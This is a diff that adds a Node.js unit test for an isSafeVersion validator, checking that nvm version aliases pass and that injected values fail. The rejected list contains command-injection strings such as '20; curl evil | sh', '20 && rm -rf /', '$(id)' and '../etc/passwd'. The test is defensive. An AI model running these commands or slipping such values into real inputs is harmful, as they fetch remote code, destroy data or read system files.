@@ -2,6 +2,7 @@ import assert from "node:assert/strict";
 import { test } from "node:test";
 import {
   compareVersions,
+  isSafeVersion,
   parseEnginesNode,
   parseNvmrc,
   parseRequested,
@@ -58,4 +59,40 @@ test("parseEnginesNode extracts a usable version", () => {
   assert.equal(parseEnginesNode("22.16.0"), "22.16.0");
   assert.equal(parseEnginesNode("^18.12.0"), "18.12.0");
   assert.equal(parseEnginesNode("latest"), undefined);
+});
+
+test("isSafeVersion accepts nvm aliases and rejects injected values", () => {
+  for (const value of [
+    "22.16.0",
+    "v22.16.0",
+    "22",
+    "22.16",
+    "lts",
+    "lts/*",
+    "lts/iron",
+    "node",
+    "latest",
+    "current",
+    "system",
+    "*",
+    "--lts",
+    " 22 ",
+  ]) {
+    assert.equal(isSafeVersion(value), true, `expected safe: ${value}`);
+  }
+
+  for (const value of [
+    "",
+    "20.11.0 --foo",
+    "-20",
+    "20; curl evil | sh",
+    "$(id)",
+    "20 && rm -rf /",
+    "`whoami`",
+    "../etc/passwd",
+    "lts/*; id",
+    "22\n23",
+  ]) {
+    assert.equal(isSafeVersion(value), false, `expected unsafe: ${value}`);
+  }
 });
